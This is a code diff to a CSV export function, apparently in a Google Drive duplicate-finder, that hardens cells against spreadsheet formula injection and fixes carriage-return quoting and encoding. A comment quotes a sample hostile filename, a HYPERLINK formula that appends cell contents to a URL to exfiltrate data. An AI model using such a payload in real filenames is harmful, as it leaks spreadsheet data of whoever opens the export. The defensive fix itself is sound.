@@ -122,18 +122,48 @@ export function buildExportItems(groups, pathMap, idToEntry, opts = {}) {
   }).flat();
 }
 
-function itemsToCsv(items) {
+// A spreadsheet evaluates a cell that BEGINS with one of these as a formula --
+// Excel, Google Sheets and LibreOffice alike. Quoting does not stop it: a
+// quoted "=HYPERLINK(...)" is still a live formula when the file is opened.
+//
+// Every cell here is a Drive filename or folder path, which is text someone
+// else may have chosen: files and folders shared into your Drive carry the
+// sharer's names. So a file called =HYPERLINK("https://…"&A1,"Open me") would
+// become a clickable exfiltration link in the spreadsheet of whoever exported
+// the results (#93, CWE-1236).
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+// Left alone: a plain number must not be turned into text by the guard above.
+// The only leading character the two patterns share is "-", and a negative
+// number is the case that matters.
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
+/**
+ * One CSV cell, RFC 4180 quoted and neutralised against formula injection.
+ */
+export function csvCell(v) {
+  let s = v == null ? "" : String(v);
+
+  if (FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)) s = "'" + s;
+
+  // \r belongs here. Without it a name containing a bare carriage return was
+  // written unquoted, so one row became two records with the wrong column
+  // counts -- and every value after it landed under the wrong header (#93).
+  if (/[",\n\r]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
+  return s;
+}
+
+export function itemsToCsv(items) {
   const cols = ["group","role","name","path","size","modifiedTime","md5Checksum",
                 "mimeType","width","height","similarityPct","matchType","id","webViewLink"];
-  const esc = v => {
-    const s = v == null ? "" : String(v);
-    if (s.includes(",") || s.includes('"') || s.includes("\n")) {
-      return '"' + s.replace(/"/g, '""') + '"';
-    }
-    return s;
-  };
-  return [cols.join(","), ...items.map(r => cols.map(c => esc(r[c])).join(","))].join("\n");
+  // CRLF between records, as RFC 4180 specifies.
+  return [cols.join(","), ...items.map(r => cols.map(c => csvCell(r[c])).join(","))].join("\r\n");
 }
+
+// Excel decides the encoding from a byte-order mark, not from the MIME type --
+// so without this every accented, CJK or emoji filename opened as mojibake,
+// which for a photo library is most of it (#93).
+export const CSV_BOM = "\uFEFF";
 
 export function wireExport() {
   const btnExportJson = el("btnExportJson");
@@ -164,7 +194,7 @@ export function wireExport() {
       if (!exportState.groups.length) { showToast("No results to export", "info"); return; }
       try {
         const items = buildExportItems(exportState.groups, exportState.pathMap, exportState.idToEntry, exportState);
-        const blob = new Blob([itemsToCsv(items)], { type: "text/csv;charset=utf-8;" });
+        const blob = new Blob([CSV_BOM + itemsToCsv(items)], { type: "text/csv;charset=utf-8;" });
         download(`ddd-results-${getTimestamp()}.csv`, blob);
         showToast(`Exported ${items.length} rows as CSV`, "success");
       } catch (e) {
